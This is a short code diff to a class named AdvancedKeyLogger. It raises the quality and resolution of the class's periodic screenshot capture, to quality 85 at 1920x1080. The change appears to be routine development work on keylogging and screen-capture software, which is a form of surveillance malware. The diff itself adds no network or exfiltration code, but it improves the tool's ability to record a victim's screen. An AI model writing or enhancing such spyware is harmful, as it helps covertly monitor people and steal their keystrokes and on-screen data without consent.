@@ -151,7 +151,9 @@ class AdvancedKeyLogger:
             try:
                 self.screenshot_capture = ScreenshotCapture(
                     callback=self._on_screenshot_taken,
-                    interval=SCREENSHOT_INTERVAL
+                    interval=SCREENSHOT_INTERVAL,
+                    quality=85,  # Higher quality (1-100)
+                    max_size=(1920, 1080)  # Full HD resolution
                 )
                 if self.screenshot_capture.start():
                     print("[+] Screenshot capture started")
